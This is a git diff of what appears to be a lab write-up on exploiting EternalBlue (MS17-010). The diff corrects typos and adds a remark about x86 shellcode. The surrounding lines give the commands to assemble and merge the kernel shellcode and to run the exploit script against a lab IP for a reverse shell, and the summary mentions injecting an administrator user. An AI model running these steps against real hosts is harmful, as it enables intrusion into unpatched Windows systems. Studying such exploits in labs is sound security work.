@@ -181,7 +181,7 @@ git clone https://github.com/worawit/MS17-010.git
 cd MS17-010/
 ```
 We will focus on the shellcode first. going into the folder shellcode and reading the file eternalblue_sc_merge.py we can get an idea how to create our shellcode and use it with this exploit.
-First we need to assemblée the shell code
+First we need to assemble the shell code
 ```
 nasm -f bin eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
 nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
@@ -198,13 +198,14 @@ cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
 cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
 python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
 ```
-We now have our exploit binary. all we have to do is to execute the exploit and wait for our shell.
+We now have our exploit binary. All we have to do is to execute the exploit and wait for our shell.
 Going back one folder and executing the exploit, we are getting and error and a reverse shell.
 ```
 cd ..
 python eternalblue_exploit7.py 10.0.2.15 ./shellcode/sc_all
 ```
 <br>
+It probably would be fine to use just the x86 version and not merge the two exploit. But in case we only want to use one exploit then we should scan carefully for the windows version.
 ![withoutPipe](/img/EternalBlue/final.png)
 <h2>Summary:</h2>
 We looked at multiple ways to exploit EternalBlue with and without pipename. We created reverse shells and injected our own administrator user.
